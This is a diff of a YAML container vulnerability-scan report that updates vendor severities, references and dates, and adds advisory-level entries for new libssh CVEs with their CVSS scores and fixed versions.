@@ -25,13 +25,18 @@
     Description: A flaw was found in c-ares. A use-after-free / double-free vulnerability exists in the query-completion handling path, where a query callback is invoked while the query is still linked in internal lookup structures. A remote attacker can exploit this via ares_getaddrinfo() over TCP by sending crafted DNS responses that force an EDNS-downgrade retry followed by a connection reset, causing the internal completion handler to access freed memory. This leads to memory corruption and a crash (denial of service), with potential for further impact depending on the allocator and build configuration.
     Severity: HIGH
     VendorSeverity:
+      alma: 3
+      amazon: 3
       redhat: 3
     CVSS:
       redhat:
         V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
         V3Score: 7.5
     References:
+    - https://access.redhat.com/errata/RHSA-2026:42096
     - https://access.redhat.com/security/cve/CVE-2026-33630
+    - https://bugzilla.redhat.com/2497686
+    - https://errata.almalinux.org/10/ALSA-2026-42096.html
     - https://github.com/c-ares/c-ares/commit/1fa3b86a0b8d18fe7b60f3228a01d770feb026bc
     - https://github.com/c-ares/c-ares/commit/d823199b688052dcdc1646f2ab4cb8c16b1c644a
     - https://nvd.nist.gov/vuln/detail/CVE-2026-33630
@@ -286,7 +291,7 @@
       Name: Alpine Secdb
       URL: https://secdb.alpinelinux.org/
     Fingerprint: sha256:451cd0f35f2513c1c42667bd1c6b972999d7215fd0dee9113e722f865519a2ab
-    Title: 'libcurl: libcurl: Information disclosure due to uncleared proxy authentication state'
+    Title: 'curl: Information disclosure due to uncleared proxy authentication state'
     Description: |-
       When reusing a libcurl handle for sequential transfers driven by
       environment-variable proxy configuration, libcurl fails to clear the proxy
@@ -1111,7 +1116,7 @@
       Name: Alpine Secdb
       URL: https://secdb.alpinelinux.org/
     Fingerprint: sha256:fad9150c15de56bbc18fd067abba5e830d7c8412cf6452a5519047cf7a988f70
-    Title: 'libcurl: libcurl: Information disclosure due to uncleared proxy authentication state'
+    Title: 'curl: Information disclosure due to uncleared proxy authentication state'
     Description: |-
       When reusing a libcurl handle for sequential transfers driven by
       environment-variable proxy configuration, libcurl fails to clear the proxy
@@ -1912,7 +1917,7 @@
     - https://ubuntu.com/security/notices/USN-8414-2
     - https://www.cve.org/CVERecord?id=CVE-2026-45447
     PublishedDate: '2026-06-09T17:17:19.277Z'
-    LastModifiedDate: '2026-07-15T14:18:11.573Z'
+    LastModifiedDate: '2026-07-20T12:19:30.657Z'
   - VulnerabilityID: CVE-2026-34182
     PkgID: libcrypto3@3.5.6-r0
     PkgName: libcrypto3
@@ -3216,7 +3221,7 @@
       using X9.42 DHX static keys with interactive protocols and therefore this
       issue was assigned Low severity.
 
-      The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are affected by this
+      The FIPS modules in 4.0, 3.6, 3.5, 3.4, 3.1.2 and 3.0 are affected by this
       issue.
     Severity: LOW
     CweIDs:
@@ -3295,7 +3300,7 @@
     - https://ubuntu.com/security/notices/USN-8414-1
     - https://www.cve.org/CVERecord?id=CVE-2026-42770
     PublishedDate: '2026-06-09T17:17:08.523Z'
-    LastModifiedDate: '2026-06-17T10:48:22.65Z'
+    LastModifiedDate: '2026-07-20T17:17:08.87Z'
   - VulnerabilityID: CVE-2026-45446
     PkgID: libcrypto3@3.5.6-r0
     PkgName: libcrypto3
@@ -3943,7 +3948,7 @@
       Name: Alpine Secdb
       URL: https://secdb.alpinelinux.org/
     Fingerprint: sha256:e17fbd0600883085b9a2c76411d07c997fb35ffdc7e1ade69703d8f04e92274b
-    Title: 'libcurl: libcurl: Information disclosure due to uncleared proxy authentication state'
+    Title: 'curl: Information disclosure due to uncleared proxy authentication state'
     Description: |-
       When reusing a libcurl handle for sequential transfers driven by
       environment-variable proxy configuration, libcurl fails to clear the proxy
@@ -4653,7 +4658,7 @@
     - https://nvd.nist.gov/vuln/detail/CVE-2026-50219
     - https://www.cve.org/CVERecord?id=CVE-2026-50219
     PublishedDate: '2026-06-04T06:16:25.05Z'
-    LastModifiedDate: '2026-06-17T10:57:38.927Z'
+    LastModifiedDate: '2026-07-22T20:10:00.127Z'
   - VulnerabilityID: CVE-2026-56132
     PkgID: libexpat@2.8.1-r0
     PkgName: libexpat
@@ -5005,6 +5010,406 @@
     - https://www.cve.org/CVERecord?id=CVE-2026-56412
     PublishedDate: '2026-06-21T17:16:44.657Z'
     LastModifiedDate: '2026-06-23T15:31:30.853Z'
+  - VulnerabilityID: CVE-2026-59851
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59851
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:ef3d778ddbde247a388f1ba48680a2ed5fdc3a52051e9d6dc8d748391465d655
+    Title: 'libssh: libssh: authentication bypass via missing GSSAPI principal check'
+    Description: A flaw was found in libssh. On servers with GSSAPIKeyExchange enabled, the gssapi-keyex path does not verify whether the authenticated Kerberos principal is authorized for the requested local user, allowing authenticated clients to log in as arbitrary users.
+    Severity: HIGH
+    CweIDs:
+    - CWE-863
+    VendorSeverity:
+      redhat: 3
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+        V3Score: 8.8
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59851
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498184
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59851
+    - https://www.cve.org/CVERecord?id=CVE-2026-59851
+    PublishedDate: '2026-07-21T15:16:37.897Z'
+    LastModifiedDate: '2026-07-22T20:17:04.877Z'
+  - VulnerabilityID: CVE-2026-15370
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-15370
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:8f81fdd47f142827ad4dedfd5c431f97cb9dc1901389a8312a1a82161c55f458
+    Title: 'libssh: libssh: stack buffer overflow in SFTP server longname construction'
+    Description: A flaw was found in libssh. During SFTP server directory listing, the longname field is constructed with unsafe concatenation into a fixed-size stack buffer. When a client causes the server to list attacker-controlled filenames, sufficiently long names can overflow that stack buffer and may lead to crashes or possible code execution on the server.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-121
+    VendorSeverity:
+      redhat: 2
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H
+        V3Score: 6.7
+    References:
+    - https://access.redhat.com/security/cve/CVE-2026-15370
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2499049
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-15370
+    - https://www.cve.org/CVERecord?id=CVE-2026-15370
+    PublishedDate: '2026-07-21T09:16:53.683Z'
+    LastModifiedDate: '2026-07-22T18:16:55.26Z'
+  - VulnerabilityID: CVE-2026-59843
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59843
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:7771611fc2165d846a5073ad7ec967d7a6a9f256d4648e33e20b4c8f0d757917
+    Title: 'libssh: libssh: denial of service via zero advertised channel packet size'
+    Description: A flaw was found in libssh. A remote authenticated peer can advertise a zero maximum packet size in SSH_MSG_CHANNEL_OPEN, causing later channel writes to loop indefinitely and consume CPU, leading to denial of service.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-400
+    VendorSeverity:
+      redhat: 2
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
+        V3Score: 6.5
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59843
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498176
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59843
+    - https://www.cve.org/CVERecord?id=CVE-2026-59843
+    PublishedDate: '2026-07-21T12:18:57.86Z'
+    LastModifiedDate: '2026-07-22T20:17:03.287Z'
+  - VulnerabilityID: CVE-2026-59844
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59844
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:a399edc120859b12791b1419d3229031f7fd5fda1d0a28cf868729932c329b6e
+    Title: 'libssh: libssh: denial of service via oversized SFTP read length'
+    Description: A flaw was found in libssh. A remote authenticated client can issue SSH_FXP_READ requests with an arbitrarily large length, causing a libssh SFTP server to allocate excessive memory and potentially exhaust it through repeated requests.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-789
+    VendorSeverity:
+      redhat: 2
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
+        V3Score: 6.5
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59844
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498177
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59844
+    - https://www.cve.org/CVERecord?id=CVE-2026-59844
+    PublishedDate: '2026-07-21T12:18:57.973Z'
+    LastModifiedDate: '2026-07-22T20:17:03.443Z'
+  - VulnerabilityID: CVE-2026-59845
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59845
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:7cab232660e96a31d165ec927d4ea4b99972cdb0b487884488afeda355804962
+    Title: 'libssh: libssh: denial of service via unchecked ProxyCommand fork() failure'
+    Description: A flaw was found in libssh. When ProxyCommand is used, an unchecked fork() failure can be stored as process ID -1; during cleanup, signals may then be sent across the caller's accessible process tree, leading to local denial of service.
+    Severity: MEDIUM
+    VendorSeverity:
+      redhat: 2
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:N/I:N/A:H
+        V3Score: 5.3
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59845
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498178
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59845
+    - https://www.cve.org/CVERecord?id=CVE-2026-59845
+    PublishedDate: '2026-07-21T12:18:58.103Z'
+    LastModifiedDate: '2026-07-22T20:17:03.6Z'
+  - VulnerabilityID: CVE-2026-59847
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59847
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:789aa6bc44cd693c30c2801332e5e82f1cd8d0551d6681cc49153b51dc93d687
+    Title: 'libssh: libssh: integrity downgrade via OpenSSL AES-GCM tag verification'
+    Description: A flaw was found in libssh. Incorrect AES-GCM finalization checks in builds using the OpenSSL backend can effectively remove integrity protection, allowing an in-path attacker to modify plaintext on the wire without detection.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-1310
+    VendorSeverity:
+      redhat: 2
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N
+        V3Score: 5.9
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59847
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498180
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59847
+    - https://www.cve.org/CVERecord?id=CVE-2026-59847
+    PublishedDate: '2026-07-21T14:16:34.657Z'
+    LastModifiedDate: '2026-07-22T20:17:03.95Z'
+  - VulnerabilityID: CVE-2026-59848
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59848
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:68296a0d1fc627e63fe5d3ea1240730f87e7899919cbbc3859a500fec7b09835
+    Title: 'libssh: libssh: denial of service via SFTP responses with unknown request IDs'
+    Description: A flaw was found in libssh. A malicious SFTP server can send responses for unknown request IDs that libssh clients keep queued indefinitely, causing unbounded memory growth and client-side denial of service.
+    Severity: MEDIUM
+    VendorSeverity:
+      redhat: 2
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
+        V3Score: 5.3
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59848
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498181
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59848
+    - https://www.cve.org/CVERecord?id=CVE-2026-59848
+    PublishedDate: '2026-07-21T14:16:34.79Z'
+    LastModifiedDate: '2026-07-22T20:17:04.123Z'
+  - VulnerabilityID: CVE-2026-59850
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59850
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:89887d895bcaf9e5c0fd6276856b0297e4949d12123944be27462e13feb9db77
+    Title: 'libssh: libssh: use-after-free via data callbacks on closed channels'
+    Description: A flaw was found in libssh. If data packets are processed after a channel is closed, channel data callbacks can be invoked after the associated data has already been freed, leading to crashes or possible use-after-free conditions.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-416
+    VendorSeverity:
+      redhat: 2
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L
+        V3Score: 4.3
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59850
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498183
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59850
+    - https://www.cve.org/CVERecord?id=CVE-2026-59850
+    PublishedDate: '2026-07-21T15:16:37.773Z'
+    LastModifiedDate: '2026-07-22T20:17:04.693Z'
+  - VulnerabilityID: CVE-2026-59842
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59842
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:ffc6669a6a0d41a6772580c21a6441dc0fbdf8b1f26e307797a2f16b262114e9
+    Title: 'libssh: libssh: information disclosure via short GSSAPI Curve25519 public key'
+    Description: A flaw was found in libssh. During server-side GSSAPI key exchange, a client-supplied Curve25519 public key shorter than the expected length is copied without proper length validation, leading to an out-of-bounds heap read. This could allow a remote unauthenticated attacker to disclose small amounts of server memory.
+    Severity: LOW
+    CweIDs:
+    - CWE-125
+    VendorSeverity:
+      redhat: 1
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
+        V3Score: 3.7
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59842
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498168
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59842
+    - https://www.cve.org/CVERecord?id=CVE-2026-59842
+    PublishedDate: '2026-07-21T12:18:57.727Z'
+    LastModifiedDate: '2026-07-22T20:17:03.12Z'
+  - VulnerabilityID: CVE-2026-59846
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59846
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:7eaf1aced70f21d975172929e71e05c84ac515e086e89cfaf681f2c5aeb41b82
+    Title: 'libssh: libssh: information disclosure via ProxyCommand %r username expansion'
+    Description: A flaw was found in libssh. A malicious username expanded through %r in ProxyCommand handling can inject shell metacharacters, exposing environment variables and causing unintended shell behavior.
+    Severity: LOW
+    VendorSeverity:
+      redhat: 1
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N
+        V3Score: 3.9
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59846
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498179
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59846
+    - https://www.cve.org/CVERecord?id=CVE-2026-59846
+    PublishedDate: '2026-07-21T13:17:18.143Z'
+    LastModifiedDate: '2026-07-22T20:17:03.777Z'
+  - VulnerabilityID: CVE-2026-59849
+    PkgID: libssh@0.12.0-r0
+    PkgName: libssh
+    PkgIdentifier:
+      PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3.24.0_alpha20260127
+      UID: 5849b769800139b
+    InstalledVersion: 0.12.0-r0
+    FixedVersion: 0.12.1-r0
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59849
+    DataSource:
+      ID: alpine
+      Name: Alpine Secdb
+      URL: https://secdb.alpinelinux.org/
+    Fingerprint: sha256:9e4aa6dba00680b548d5a1a721783ac5313e637a62615143efe3f0c8374bd47e
+    Title: 'libssh: libssh: denial of service via automatic certificate authentication loop'
+    Description: A flaw was found in libssh. Logic errors in automatic certificate-based public key authentication can cause libssh clients to loop indefinitely when configured certificates are missing or repeatedly rejected by a server, leading to denial of service.
+    Severity: LOW
+    CweIDs:
+    - CWE-835
+    VendorSeverity:
+      redhat: 1
+    CVSS:
+      redhat:
+        V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L
+        V3Score: 3.1
+    References:
+    - https://access.redhat.com/errata/RHSA-2026:42922
+    - https://access.redhat.com/security/cve/CVE-2026-59849
+    - https://bugzilla.redhat.com/show_bug.cgi?id=2498182
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59849
+    - https://www.cve.org/CVERecord?id=CVE-2026-59849
+    PublishedDate: '2026-07-21T15:16:37.647Z'
+    LastModifiedDate: '2026-07-22T20:17:04.277Z'
   - VulnerabilityID: CVE-2026-55199
     PkgID: libssh2@1.11.1-r1
     PkgName: libssh2
@@ -5308,7 +5713,7 @@
     - https://ubuntu.com/security/notices/USN-8414-2
     - https://www.cve.org/CVERecord?id=CVE-2026-45447
     PublishedDate: '2026-06-09T17:17:19.277Z'
-    LastModifiedDate: '2026-07-15T14:18:11.573Z'
+    LastModifiedDate: '2026-07-20T12:19:30.657Z'
   - VulnerabilityID: CVE-2026-34182
     PkgID: libssl3@3.5.6-r0
     PkgName: libssl3
@@ -6612,7 +7017,7 @@
       using X9.42 DHX static keys with interactive protocols and therefore this
       issue was assigned Low severity.
 
-      The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are affected by this
+      The FIPS modules in 4.0, 3.6, 3.5, 3.4, 3.1.2 and 3.0 are affected by this
       issue.
     Severity: LOW
     CweIDs:
@@ -6691,7 +7096,7 @@
     - https://ubuntu.com/security/notices/USN-8414-1
     - https://www.cve.org/CVERecord?id=CVE-2026-42770
     PublishedDate: '2026-06-09T17:17:08.523Z'
-    LastModifiedDate: '2026-06-17T10:48:22.65Z'
+    LastModifiedDate: '2026-07-20T17:17:08.87Z'
   - VulnerabilityID: CVE-2026-45446
     PkgID: libssl3@3.5.6-r0
     PkgName: libssl3
@@ -7272,7 +7677,7 @@
     - https://ubuntu.com/security/notices/USN-8414-2
     - https://www.cve.org/CVERecord?id=CVE-2026-45447
     PublishedDate: '2026-06-09T17:17:19.277Z'
-    LastModifiedDate: '2026-07-15T14:18:11.573Z'
+    LastModifiedDate: '2026-07-20T12:19:30.657Z'
   - VulnerabilityID: CVE-2026-34182
     PkgID: openssl@3.5.6-r0
     PkgName: openssl
@@ -8576,7 +8981,7 @@
       using X9.42 DHX static keys with interactive protocols and therefore this
       issue was assigned Low severity.
 
-      The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are affected by this
+      The FIPS modules in 4.0, 3.6, 3.5, 3.4, 3.1.2 and 3.0 are affected by this
       issue.
     Severity: LOW
     CweIDs:
@@ -8655,7 +9060,7 @@
     - https://ubuntu.com/security/notices/USN-8414-1
     - https://www.cve.org/CVERecord?id=CVE-2026-42770
     PublishedDate: '2026-06-09T17:17:08.523Z'
-    LastModifiedDate: '2026-06-17T10:48:22.65Z'
+    LastModifiedDate: '2026-07-20T17:17:08.87Z'
   - VulnerabilityID: CVE-2026-45446
     PkgID: openssl@3.5.6-r0
     PkgName: openssl
@@ -11012,6 +11417,7 @@
     - CWE-78
     - CWE-94
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       photon: 3
@@ -11059,6 +11465,7 @@
     CweIDs:
     - CWE-77
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       redhat: 2
@@ -11105,6 +11512,7 @@
     CweIDs:
     - CWE-787
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       redhat: 2
@@ -11151,6 +11559,7 @@
     CweIDs:
     - CWE-94
     VendorSeverity:
+      amazon: 3
       azure: 3
       nvd: 3
       redhat: 3
@@ -11285,6 +11694,7 @@
     CweIDs:
     - CWE-787
     VendorSeverity:
+      amazon: 3
       azure: 2
       photon: 2
       redhat: 2
@@ -11328,6 +11738,7 @@
     CweIDs:
     - CWE-125
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 2
       photon: 2
@@ -11417,6 +11828,7 @@
     CweIDs:
     - CWE-125
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 2
       redhat: 2
@@ -11650,6 +12062,7 @@
     - CWE-78
     - CWE-94
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       photon: 3
@@ -11697,6 +12110,7 @@
     CweIDs:
     - CWE-77
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       redhat: 2
@@ -11743,6 +12157,7 @@
     CweIDs:
     - CWE-787
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       redhat: 2
@@ -11789,6 +12204,7 @@
     CweIDs:
     - CWE-94
     VendorSeverity:
+      amazon: 3
       azure: 3
       nvd: 3
       redhat: 3
@@ -11923,6 +12339,7 @@
     CweIDs:
     - CWE-787
     VendorSeverity:
+      amazon: 3
       azure: 2
       photon: 2
       redhat: 2
@@ -11966,6 +12383,7 @@
     CweIDs:
     - CWE-125
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 2
       photon: 2
@@ -12055,6 +12473,7 @@
     CweIDs:
     - CWE-125
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 2
       redhat: 2
@@ -12772,6 +13191,7 @@
     - CWE-78
     - CWE-94
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       photon: 3
@@ -12819,6 +13239,7 @@
     CweIDs:
     - CWE-77
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       redhat: 2
@@ -12865,6 +13286,7 @@
     CweIDs:
     - CWE-787
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 3
       redhat: 2
@@ -12911,6 +13333,7 @@
     CweIDs:
     - CWE-94
     VendorSeverity:
+      amazon: 3
       azure: 3
       nvd: 3
       redhat: 3
@@ -13045,6 +13468,7 @@
     CweIDs:
     - CWE-787
     VendorSeverity:
+      amazon: 3
       azure: 2
       photon: 2
       redhat: 2
@@ -13088,6 +13512,7 @@
     CweIDs:
     - CWE-125
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 2
       photon: 2
@@ -13177,6 +13602,7 @@
     CweIDs:
     - CWE-125
     VendorSeverity:
+      amazon: 3
       azure: 2
       nvd: 2
       redhat: 2
@@ -13242,6 +13668,334 @@
   Type: jar
   Packages: []
   Vulnerabilities:
+  - VulnerabilityID: GHSA-r7wm-3cxj-wff9
+    PkgName: com.fasterxml.jackson.core:jackson-core
+    PkgPath: openaf/openaf.jar
+    PkgIdentifier:
